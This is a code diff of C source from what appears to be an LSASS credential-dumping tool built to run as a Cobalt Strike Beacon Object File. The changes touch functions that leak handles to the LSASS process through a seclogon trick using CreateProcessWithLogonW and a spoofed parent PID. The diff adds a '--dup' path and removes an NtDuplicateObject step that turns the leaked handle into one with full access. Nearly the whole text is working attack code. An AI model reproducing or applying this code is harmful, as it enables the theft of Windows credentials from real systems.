@@ -9,17 +9,7 @@ PHANDLE_LIST find_process_handles_in_lsass(
     PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
     if (!handle_list)
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-            (ULONG32)sizeof(HANDLE_LIST),
-            GetLastError()
-        );
-#endif
+        malloc_failed();
         return NULL;
     }
 
@@ -120,6 +110,7 @@ BOOL seclogon_stage_1(
     LPCSTR dump_name,
     BOOL fork,
     BOOL valid,
+    BOOL dup,
     DWORD lsass_pid
 )
 {
@@ -223,24 +214,22 @@ BOOL seclogon_stage_1(
         );
         if (!success)
         {
-            DWORD error = GetLastError();
-            if (error != INVALID_HANDLE)
-            {
-#ifdef DEBUG
-#ifdef BOF
-                BeaconPrintf(CALLBACK_ERROR,
-#else
-                printf(
-#endif
-                    "Failed to call CreateProcessWithLogonW, error: %ld\n",
-                    error
-                );
-#endif
-                change_pid(original_pid, NULL);
-                intFree(handle_list); handle_list = NULL;
-                return FALSE;
-            }
-            continue;
+            function_failed("CreateProcessWithLogonW");
+            change_pid(original_pid, NULL);
+            intFree(handle_list); handle_list = NULL;
+            return FALSE;
+        }
+        if (dup)
+        {
+            /*
+             * --seclogon was used together with --dup
+             * once the process was created,
+             * return and duplicate the handle
+             */
+            // sleep 5 seconds to let LSASS process the new (fake) credentials
+            Sleep(5000);
+            // TODO: check that the 3 handles we leaked are actually valid
+            return TRUE;
         }
         // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
         HANDLE hSpoofedProcess = get_process_handle(
@@ -277,8 +266,7 @@ BOOL seclogon_stage_1(
 
 #ifndef BOF
 HANDLE seclogon_stage_2(
-    LPCSTR dump_path,
-    BOOL fork
+    LPCSTR dump_path
 )
 {
     // if the file already exists, exit
@@ -291,37 +279,6 @@ HANDLE seclogon_stage_2(
         {
             NtClose((HANDLE)(ULONG_PTR)leakedHandle);
             continue;
-        }
-        if (fork)
-        {
-            // the leaked handle does not have PROCESS_CREATE_PROCESS right so we cannot use it for NtCreateProcessEx call. Using a trick by @tiraniddo to get a handle with full access:
-            // "The DuplicateHandle system call has an interesting behaviour when using the pseudo current process handle, which has the value -1. Specifically if you try and duplicate the pseudo handle from another process you get back a full access handle to the source process."
-            // details here --> https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
-            HANDLE hDuped = NULL;
-            NTSTATUS status = NtDuplicateObject(
-                (HANDLE)(ULONG_PTR)leakedHandle,
-                (HANDLE)-1,
-                NtCurrentProcess(),
-                &hDuped,
-                0,
-                0,
-                DUPLICATE_SAME_ACCESS
-            );
-            if (!NT_SUCCESS(status))
-            {
-#ifdef DEBUG
-#ifdef BOF
-                BeaconPrintf(CALLBACK_ERROR,
-#else
-                printf(
-#endif
-                    "Failed to call NtDuplicateObject, status: %ld\n",
-                    status
-                );
-#endif
-                return NULL;
-            }
-            return hDuped;
         }
         return (HANDLE)(ULONG_PTR)leakedHandle;
     }
